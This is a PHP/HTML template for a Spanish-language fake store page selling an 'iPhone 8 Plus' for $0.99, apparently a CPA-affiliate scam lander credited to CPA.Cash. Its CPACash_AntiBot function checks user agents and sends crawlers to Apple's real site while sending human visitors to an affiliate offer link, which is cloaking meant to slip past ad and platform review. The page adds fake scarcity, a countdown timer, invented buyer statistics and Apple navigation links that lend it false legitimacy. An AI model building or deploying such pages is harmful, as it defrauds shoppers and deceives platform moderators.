<?php
#No tocar
function CPACash_AntiBot() {
	if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|Facebot|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
		return TRUE;
	}else{
		return FALSE;
	}
}

#Configurar
$Enlace_Oferta = 'http://mobtapapps.com/?offer=35-501&fallback=0';
?>


<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"/>
<meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport"/>
<title><? echo strtoupper($_SERVER['HTTP_HOST']); ?></title>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
<link rel="stylesheet" type="text/css" href="css/slick.min.css"/>
<link rel="stylesheet" type="text/css" href="css/index.css"/>
<link rel="shortcut icon" href="img/favicon.ico" type="image/ico" />
    <meta property="og:site_name" content="<? echo strtoupper($_SERVER['HTTP_HOST']); ?>">
    <meta property="og:description" content="¡Haz click para comprar!">
    <meta property="og:title" content="Compra iPhone a precio de fabrica">
    <meta property="og:url" content="<? echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?>">
    <meta property="og:image" content="<? echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?>960x0s.jpg">
    <meta property="og:type" content="article">
</head>
<body>
<div id="general">
	<div id="cab">
		<div class="menucab">
			<div class="cont">
				<div class="menucabizq"><span><strong>Envío gratis</strong> con todas las compras</span></div>
				<div class="menucabder">
					<span class="carrito"><i class="fa fa-shopping-cart"></i> Mi carrito</span>
					<input type="text" placeholder="Buscar"/>
				</div>
			</div>
			<div class="cbi"></div>
		</div>
		<div class="menulogo">
			<div class="cont">
				<a class="logo" href="#"><img src="img/logo2.png"/></a>
				<ul>
					<li><a href="https://www.apple.com/la/iphone/">Inicio</a></li>
					<li><a href="https://www.apple.com/la/iphone/">Productos</a></li>
					<li><a href="https://www.apple.com/la/newsroom/">Preguntas frecuentes</a></li>
					<li><a href="https://support.apple.com/es-lamr">Contacto</a></li>
				</ul>
			</div>
			<div class="cbi"></div>
		</div>
	</div>
	<div id="producto">
		<div class="cont">
			<div class="breadcrumb"><a href="#">Inicio</a> <i class="fa fa-angle-right"></i> iPhone 8 Plus</div>
			<div class="productofinal">
				<div class="mit">
					<div class="slider slider-for">
						<div><img src="img/phone-1.jpg"/></div>
						<div><img src="img/phone-4.jpg"/></div>
						<div><img src="img/phone-3.jpg"/></div>
					</div>
					<div class="slider slider-nav">
						<div><img src="img/phone-1.jpg"/></div>
						<div><img src="img/phone-4.jpg"/></div>
						<div><img src="img/phone-3.jpg"/></div>

					</div>
				</div>
				<div class="mit">
					<div class="titulo">
						<h1>iPhone 8 Plus</h1>
						<h2>$0.99 <span class="tacha">$799.00</span></h2>
						<div class="ordengen">
							<div class="cantidad">
								<label for="cantidad">Cantidad</label>
								<input type="number" value="1" min="1" id="cantidad"/>
							</div>
							<button class="comprar" onclick="location.href='<? echo CPACash_AntiBot() ? 'https://www.apple.com/lae/iphone-8/' : $Enlace_Oferta; ?>';">¡Comprar ahora!</button>
						</div>
						<div class="btntarj" style="background: white; padding: 5px; border-radius: 5px;">
							<img src="img/tarjetas.png"/>
						</div>
						<div class="apurate">
							<strong>¡Date prisa! Sólo quedan <span class="partnum">15</span> en stock</strong>
							<div class="barra"><div class="barrain"></div></div>
							<div class="cbi"></div>
							<div id="contador">
								<div id="dias">00</div>
								<div id="horas">05</div>
								<div id="minutos">48</div>
								<div id="segundos">02</div>
							</div>
							<div class="cbi"></div>
							<div class="vistas"><span></span> personas están viendo este ahora producto</div>
						</div>
					</div>
					<div class="cbi"></div>
					<div class="caracs">
						<ul class="listneg">
							<li>99.3% compradores recomiendan este producto</li>
							<li>Envío rápido disponible</li>
							<li>Pago vía: Amex | Visa | MasterCard | Discover | PayPal</li>
						</ul>
						<h3>Características</h3>
						<p>A pesar de todo lo que se ha hablado al respecto, parece que Apple sigue apostando por los paneles IPS y deja el OLED para el iPhone X. Así pues en los nuevos iPhone 8 y 8 Plus nos topamos con una pantalla con esta tecnología de 4,7 y 5,5 pulgadas respectivamente, misma diagonal que en los modelos anteriores.
							<br><br>
						A pesar de las pocas diferencias que encontramos con los paneles de los nuevos dispositivos y los de sus sucesores, Apple ha incorporado una característica distintiva: la tecnología True Tone. Esta tecnología se estrenó en el iPad Pro de 9,7 pulgadas y adapta la pantalla a la tonalidad ambiente para (en teoría) ayudar a la vista y evitar la fatiga.</p>
						<h3>Carga Inalambrica</h3>
						<p>Además de la alegría que nos hubiera dado que las dos versiones del iPhone 8 contasen con cámara dual, hay algunas cosas más que quizás nos hubiera gustado ver cambiar. Por un lado y pese a que Apple mantiene muerta la configuración de 16 GB, y al fin se carga la de 32 GB, seguimos sin ver la posibilidad de ampliación de forma externa.</p>
					</div>
				</div>
			</div>
		</div>
		<div class="cbi"></div>
	</div>
	<div id="footer">
		<div class="cont">
			<div class="tri">
				<h4>Newsletter</h4>
				<p>Suscríbete para recibir las últimas ofertas</p>
				<input type="email" placeholder="Tu e-mail"/>
				<button>Suscribirse</button>
			</div>
			<div class="tri">
				<h4>Nosotros</h4>
				<ul>
					<li><a href="https://www.apple.com/la/iphone/">Sobre nosotros</a></li>
					<li><a href="https://www.apple.com/la/iphone/">Por qué elegirnos</a></li>
					<li><a href="https://www.apple.com/la/iphone/">Preguntas frecuentes</a></li>
				</ul>
			</div>
			<div class="tri">
				<h4>Útil</h4>
				<ul>
					<li><a href="https://www.apple.com/la/iphone/">Comprar con confianza</a></li>
					<li><a href="https://www.apple.com/la/iphone/">Guía de compra</a></li>
					<li><a href="https://www.apple.com/la/iphone/">Política de devolución</a></li>
					<li><a href="https://www.apple.com/la/iphone/">Política de privacidad</a></li>
				</ul>
			</div>
			<div class="cbi"></div>
			<div class="copy">
				<span>Copyright © 2017 <? echo strtoupper($_SERVER['HTTP_HOST']); ?> <a href="#" target="_blank">Desarrollado por Shipify</a></span>
				<div class="logostarj">
					<i class="fa fa-cc-amex"></i>
					<i class="fa fa-cc-visa"></i>
					<i class="fa fa-cc-mastercard"></i>
					<i class="fa fa-cc-discover"></i>
					<i class="fa fa-cc-paypal"></i>
				</div>
			</div>
		</div>
	</div>
</div>
<!--Este material es propiedad de https://CPA.Cash-->
<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="js/slick.min.js"></script>
<script type="text/javascript" src="js/general.js"></script>
</body>
</html>